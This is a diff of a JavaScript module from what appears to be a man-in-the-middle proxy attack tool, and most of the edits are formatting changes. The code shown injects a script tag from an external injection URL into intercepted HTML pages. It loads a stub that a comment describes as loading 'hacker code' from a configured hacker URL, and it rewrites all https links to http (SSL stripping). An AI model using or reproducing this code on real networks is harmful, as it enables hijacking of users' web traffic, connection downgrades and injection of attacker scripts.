@@ -1,4 +1,4 @@
-﻿'use strict';
+'use strict';
 
 var proxyDns = require('./proxy_dns.js'),
 	proxyWeb = require('./proxy_web.js'),
@@ -40,8 +40,8 @@ fs.watch(INJECT_FILE, function() {
 
 function updateInjectJs() {
 	try {
-		INJECT_JS = Read(INJECT_FILE)
-			.replace('$LIST', jslib_list.join('|'));
+		INJECT_JS = Read(INJECT_FILE).
+		    replace('$LIST', jslib_list.join('|'));
 	}
 	catch(e) {
 	}
@@ -76,8 +76,8 @@ parseList();
 // - 加载hacker代码
 // - 加载原始脚本内容（在未来用户浏览时加载，让页面正常运行）
 //
-var stubCode = Read('asset/stub.js').
-	replace('$URL_HACKER', config['hacker_url']);
+var stubCode = Read('asset/stub.js')
+	.replace('$URL_HACKER', config['hacker_url']);
 
 
 exports.injectJs = function(url) {
@@ -101,14 +101,14 @@ exports.injectJs = function(url) {
 var injectCode =
 	'<script src="http://' + INJECT_URL + '"></script>';
 
-exports.injectHtml = function(html, charset, httpsPage) {
+exports.injectHtml = function(html, charset) {
 	//
 	// 优先使用<meta>标签里的charset标记：
 	//   <meta charset="utf-8" />
 	//   <META HTTP-EQUIV="Content-Type" CONTENT='text/html; CHARSET=GBK'>
 	//
 	var str = html.toString();
-	var val = str.match(/charset=['"]?([\w-]*)/i);
+	var val = str.match(/charset=['"]?([\w\-]*)/i);
 
 	if (val && val[1]) {
 		charset = val[1];
@@ -135,7 +135,7 @@ exports.injectHtml = function(html, charset, httpsPage) {
 	//
 	// 替换页面中的https链接为http，并做记录
 	//
-	html = html.replace(/https:\/\/([\w\.\-_/?%&=+,]*)/g, function(str, url) {
+	html = html.replace(/https:\/\/([\w\.\-\/_?%&=+,]*)/g, function(str, url) {
 		proxyWeb.addHttpsUrl(url);
 		return 'http://' + url;
 	});
